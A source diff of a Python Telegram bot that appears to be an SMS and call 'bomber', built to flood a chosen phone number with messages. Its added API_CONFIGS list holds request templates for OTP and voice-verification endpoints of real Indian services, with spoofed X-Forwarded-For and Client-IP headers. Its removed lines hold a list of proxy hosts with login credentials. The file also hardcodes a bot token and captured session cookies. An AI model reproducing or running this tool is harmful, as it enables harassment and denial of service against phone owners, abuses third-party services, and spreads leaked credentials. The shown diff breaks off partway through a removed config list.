@@ -1,15 +1,12 @@
 #!/usr/bin/env python3
-# ========== RAILWAY SPECIFIC SETTINGS ==========
 import os
 import sys
 
 # Get Railway-specific environment variables
 PORT = os.getenv('PORT', None)
 RAILWAY_ENVIRONMENT = os.getenv('RAILWAY_ENVIRONMENT', 'production')
-RAILWAY_GIT_COMMIT_SHA = os.getenv('RAILWAY_GIT_COMMIT_SHA', 'unknown')
 
 print(f"🚂 Railway Environment: {RAILWAY_ENVIRONMENT}")
-print(f"🔧 Commit SHA: {RAILWAY_GIT_COMMIT_SHA[:8] if RAILWAY_GIT_COMMIT_SHA != 'unknown' else 'unknown'}")
 print(f"🌐 PORT: {PORT}")
 
 import asyncio
@@ -38,164 +35,33 @@ import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # ========== CONFIGURATION ==========
-# Get token from environment variable (Railway will inject this)
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAF3VSZLTvvLcyY73JdvPq8FWZPyPC7JNcw")
 ADMIN_ID = 8291098446  # Your Telegram user ID
 
-# Store user data (in production, consider using Redis)
-user_sessions = {}  # user_id -> {start_time, phone, task}
+# Store user data
+user_sessions = {}
 user_stats = defaultdict(lambda: {"requests": 0, "success": 0, "failed": 0})
-approved_users = set()  # Users with no time limit
-admin_users = set([ADMIN_ID])  # Admin users
-banned_users = set()  # Banned users
-all_users = set()  # All users who have started the bot
+approved_users = set()
+admin_users = set([ADMIN_ID])
+banned_users = set()
+all_users = set()
 
 # Global stats
 global_stats = {
     "total_bombs": 0,
     "active_sessions": 0,
     "total_users": 0,
-    "success_rate": 0.0,
     "total_requests": 0,
     "start_time": time.time()
 }
 
-# Configure logging for Railway
+# Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO,
-    handlers=[
-        logging.StreamHandler(sys.stdout)
-    ]
+    handlers=[logging.StreamHandler(sys.stdout)]
 )
 logger = logging.getLogger(__name__)
-
-# Proxy configuration
-PROXIES = [
-    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px220601.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px013302.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px480301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px010702.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px490402.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px320702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px260901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px241102.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px051703.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px032002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px410701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px022409.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px051005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px430403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px012702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px370505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px430403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px241104.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px016102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px173007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px121101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px591203.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px490701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px730503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px1210303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px520401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px1160303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px570201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px440401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px420602.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px016501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px014004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px013301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px710701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px700403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px591201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px013601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px331101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px121001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px320705.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px870303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px460101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px600303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px591701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px460101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px043005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px490402.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px040706.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px022408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px060301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px280301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px380101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px251002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px1330403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px023004.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px480301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px016006.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px580801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px570201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px510201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px591801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px300902.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px591801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px023004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px013403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px500401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px032004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px040805.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px400408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px1260302.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px591201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px180801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px150902.pointtosender.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px032002.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px040706.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px591701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px022505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px023005.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
-    "px140801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px440401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px100801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz"
-]
 
 # ========== ANIME STYLES ==========
 ANIME_STYLES = {
@@ -218,19 +84,296 @@ ANIME_STYLES = {
     "ghost": "👻",
     "dragon": "🐉",
     "ninja": "🥷",
-    "samurai": "⚔️",
     "back": "🔙",
-    "hourglass": "⏳",
-    "lock": "🔒",
-    "unlock": "🔓",
-    "zap": "⚡",
-    "boom": "💥",
-    "users": "👥"
+    "hourglass": "⏳"
 }
+
+# ========== YOUR WORKING API CONFIGURATIONS ==========
+API_CONFIGS = [
+    {
+        "name": "Hungama",
+        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "payload": {
+            "mobileNo": "{phone}",
+            "countryCode": "+91",
+            "appCode": "un",
+            "messageId": "1",
+            "emailId": "",
+            "subject": "Register",
+            "priority": "1",
+            "device": "web",
+            "variant": "v1",
+            "templateCode": 1
+        },
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Content-Type": "application/json",
+            "identifier": "home",
+            "mlang": "en",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "sec-ch-ua-mobile": "?1",
+            "alang": "en",
+            "country_code": "IN",
+            "vlang": "en",
+            "origin": "https://www.hungama.com",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.hungama.com/",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+            "priority": "u=1, i",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Meru Cab",
+        "endpoint": "https://merucabapp.com/api/otp/generate",
+        "method": "POST",
+        "payload": {"mobile_number": "{phone}"},
+        "headers": {
+            "Mobilenumber": "{phone}",
+            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
+            "Oauthtoken": "",
+            "AppVersion": "245",
+            "ApiVersion": "6.2.55",
+            "DeviceType": "Android",
+            "DeviceId": "44098bdebb2dc047",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Host": "merucabapp.com",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip",
+            "User-Agent": "okhttp/4.9.0",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Dayco India",
+        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
+        "headers": {
+            "Host": "ekyc.daycoindia.com",
+            "sec-ch-ua-platform": "\"Android\"",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "sec-ch-ua-mobile": "?1",
+            "Origin": "https://ekyc.daycoindia.com",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
+            "Priority": "u=1, i",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Doubtnut",
+        "endpoint": "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "payload": {
+            "app_version": "7.10.51",
+            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
+            "course": "",
+            "phone_number": "{phone}",
+            "language": "en",
+            "udid": "b751fb63c0ae17ba",
+            "class": "",
+            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
+        },
+        "headers": {
+            "version_code": "1160",
+            "has_upi": "false",
+            "device_model": "ASUS_I005DA",
+            "android_sdk_version": "28",
+            "content-type": "application/json; charset=utf-8",
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/5.0.0-alpha.2",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "NoBroker",
+        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
+        "method": "POST",
+        "payload": {"phone": "{phone}", "countryCode": "IN"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "sec-ch-ua-platform": "Android",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "sec-ch-ua-mobile": "?1",
+            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
+            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
+            "origin": "https://www.nobroker.in",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.nobroker.in/",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+            "priority": "u=1, i",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Shiprocket",
+        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        "method": "POST",
+        "payload": {"mobileNumber": "{phone}"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Content-Type": "application/json",
+            "sec-ch-ua-platform": "Android",
+            "authorization": "Bearer null",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "sec-ch-ua-mobile": "?1",
+            "origin": "https://app.shiprocket.in",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://app.shiprocket.in/",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+            "priority": "u=1, i",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Tata Capital",
+        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "method": "POST",
+        "payload": {"phone": "{phone}", "applSource": "", "isOtpViaCallAtLogin": "true"},
+        "headers": {
+            "Content-Type": "application/json",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "PenPencil",
+        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+        "method": "POST",
+        "payload": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"},
+        "headers": {
+            "Host": "api.penpencil.co",
+            "content-type": "application/json; charset=utf-8",
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/3.9.1",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "1mg",
+        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "payload": {"number": "{phone}", "is_corporate_user": False, "otp_on_call": True},
+        "headers": {
+            "Host": "www.1mg.com",
+            "content-type": "application/json; charset=utf-8",
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/3.9.1",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Swiggy",
+        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "method": "POST",
+        "payload": {"mobile": "{phone}"},
+        "headers": {
+            "Host": "profile.swiggy.com",
+            "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
+            "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
+            "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
+            "pl-version": "55",
+            "user-agent": "Swiggy-Android",
+            "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
+            "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
+            "version-code": "1161",
+            "app-version": "4.38.1",
+            "latitude": "0.0",
+            "longitude": "0.0",
+            "os-version": "13",
+            "accessibility_enabled": "false",
+            "swuid": "4c27ae3a76b146f3",
+            "deviceid": "4c27ae3a76b146f3",
+            "x-network-quality": "GOOD",
+            "accept-encoding": "gzip",
+            "accept": "application/json; charset=utf-8",
+            "content-type": "application/json; charset=utf-8",
+            "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "KPN Fresh",
+        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        "method": "POST",
+        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
+        "headers": {
+            "Host": "api.kpnfresh.com",
+            "sec-ch-ua-platform": "\"Android\"",
+            "cache": "no-store",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "x-channel-id": "WEB",
+            "sec-ch-ua-mobile": "?1",
+            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
+            "accept": "*/*",
+            "origin": "https://www.kpnfresh.com",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.kpnfresh.com/",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "priority": "u=1, i",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    },
+    {
+        "name": "Servetel",
+        "endpoint": "https://api.servetel.in/v1/auth/otp",
+        "method": "POST",
+        "payload": {"mobile_number": "{phone}"},
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
+            "Host": "api.servetel.in",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip",
+            "X-Forwarded-For": "{ip}",
+            "Client-IP": "{ip}"
+        }
+    }
+]
 
 # ========== PERSISTENCE FUNCTIONS ==========
 def save_state():
-    """Save bot state to file (for persistence across restarts)"""
+    """Save bot state to file"""
     try:
         state = {
             "approved_users": list(approved_users),
@@ -241,7 +384,7 @@ def save_state():
         }
         with open("bot_state.json", "w") as f:
             json.dump(state, f, indent=2)
-        logger.info("✅ Bot state saved successfully")
+        logger.info("✅ State saved")
     except Exception as e:
         logger.error(f"❌ Error saving state: {e}")
 
@@ -256,35 +399,17 @@ def load_state():
                 banned_users.update(state.get("banned_users", []))
                 all_users.update(state.get("all_users", []))
                 global_stats.update(state.get("global_stats", global_stats))
-            logger.info("✅ Bot state loaded successfully")
+            logger.info("✅ State loaded")
     except Exception as e:
         logger.error(f"❌ Error loading state: {e}")
 
 # ========== HELPER FUNCTIONS ==========
-def parse_proxy(proxy_str: str) -> Tuple[str, aiohttp.BasicAuth]:
-    """Parse proxy string into URL and auth"""
-    try:
-        host_port, username, password = proxy_str.split(':')
-        proxy_url = f"http://{host_port}"
-        auth = aiohttp.BasicAuth(username, password)
-        return proxy_url, auth
-    except:
-        # Fallback to no proxy
-        return None, None
-
-def get_random_proxy() -> Tuple[str, aiohttp.BasicAuth]:
-    """Get random proxy from list"""
-    if PROXIES:
-        proxy_str = random.choice(PROXIES)
-        return parse_proxy(proxy_str)
-    return None, None
-
 def is_admin(user_id: int) -> bool:
     """Check if user is admin"""
     return user_id in admin_users
 
 def is_approved(user_id: int) -> bool:
-    """Check if user is approved (admins are auto-approved)"""
+    """Check if user is approved"""
     return user_id in admin_users or user_id in approved_users
 
 def is_banned(user_id: int) -> bool:
@@ -310,201 +435,10 @@ def get_anime_banner() -> str:
 ╚══════════════════════════════════════╝
 """
 
-def get_attack_animation() -> List[str]:
-    """Get attack animations"""
-    return [
-        f"{ANIME_STYLES['fire']} 𝔽𝕚𝕣𝕚𝕟𝕘 𝕞𝕚𝕤𝕤𝕚𝕝𝕖𝕤...",
-        f"{ANIME_STYLES['lightning']} ℂ𝕙𝕒𝕣𝕘𝕚𝕟𝕘 𝕖𝕟𝕖𝕣𝕘𝕪...",
-        f"{ANIME_STYLES['ghost']} 𝔾𝕙𝕠𝕤𝕥 𝕡𝕣𝕠𝕥𝕠𝕔𝕠𝕝 𝕖𝕟𝕘𝕒𝕘𝕖𝕕...",
-        f"{ANIME_STYLES['ninja']} ℕ𝕚𝕟𝕛𝕒 𝕤𝕥𝕣𝕚𝕜𝕖 𝕚𝕟𝕚𝕥𝕚𝕒𝕥𝕖𝕕...",
-        f"{ANIME_STYLES['dragon']} 𝔻𝕣𝕒𝕘𝕠𝕟 𝕓𝕣𝕖𝕒𝕥𝕙 𝕒𝕔𝕥𝕚𝕧𝕒𝕥𝕖𝕕...",
-        f"{ANIME_STYLES['bomb']} ℂ𝕝𝕦𝕤𝕥𝕖𝕣 𝕓𝕠𝕞𝕓𝕤 𝕕𝕖𝕡𝕝𝕠𝕪𝕖𝕕...",
-        f"{ANIME_STYLES['rocket']} ℝ𝕠𝕔𝕜𝕖𝕥 𝕓𝕒𝕣𝕣𝕒𝕘𝕖 𝕗𝕚𝕣𝕚𝕟𝕘...",
-        f"{ANIME_STYLES['skull']} 𝕊𝕜𝕦𝕝𝕝 𝕔𝕣𝕦𝕤𝕙𝕖𝕣 𝕖𝕟𝕘𝕒𝕘𝕖𝕕..."
-    ]
-
-# ========== ENHANCED BOMBING CORE ==========
-API_CONFIGS = [
-    {
-        "name": "Hungama",
-        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "payload": {
-            "mobileNo": "{phone}",
-            "countryCode": "+91",
-            "appCode": "un",
-            "messageId": "1",
-            "emailId": "",
-            "subject": "Register",
-            "priority": "1",
-            "device": "web",
-            "variant": "v1",
-            "templateCode": 1
-        },
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-            "Content-Type": "application/json",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "Meru Cab",
-        "endpoint": "https://merucabapp.com/api/otp/generate",
-        "method": "POST",
-        "payload": {"mobile_number": "{phone}"},
-        "headers": {
-            "Mobilenumber": "{phone}",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
-    {
-        "name": "Dayco India",
-        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
-        "method": "POST",
-        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 3,
-        "retry": True
-    },
-    {
-        "name": "Doubtnut",
-        "endpoint": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "payload": {
-            "phone_number": "{phone}",
-            "language": "en"
-        },
-        "headers": {
-            "content-type": "application/json; charset=utf-8",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 3,
-        "retry": True
-    },
-    {
-        "name": "NoBroker",
-        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
-        "method": "POST",
-        "payload": {"phone": "{phone}", "countryCode": "IN"},
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Forwarded-For": "{ip}",
-            "Client-IP": "{ip}"
-        },
-        "timeout": 2,
-        "retry": True
-    },
